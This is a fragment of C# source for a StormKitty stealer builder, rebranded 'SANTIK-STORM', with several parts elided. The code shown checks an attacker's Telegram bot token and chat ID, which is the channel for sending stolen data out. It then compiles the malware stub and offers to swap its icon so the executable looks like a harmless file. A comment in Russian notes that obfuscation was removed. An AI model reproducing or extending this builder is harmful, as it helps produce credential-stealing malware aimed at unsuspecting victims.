...
namespace StormKittyBuilder
{
    class Program
    {
        ...
        static void Main(string[] args)
        {
            ...
            if (!telegram.SendMessage("✅ *SANTIK-STORM* builder connected successfully!", token, chatid))
            ...
            // Убираем обфускацию
            string finalStub = builded; // Используем скомпилированный стаб без обфускации
            ...
            if (System.IO.Directory.Exists("icons"))
                if (cli.GetBoolValue("Do you want change file icon?") == "1")
                {
                    ...
                    if (icon != null)
                        IconChanger.InjectIcon(finalStub, icon);
                }
            // Done
            cli.ShowSuccess("Stub saved: " + finalStub);
            Console.ReadLine();
        }
    }
}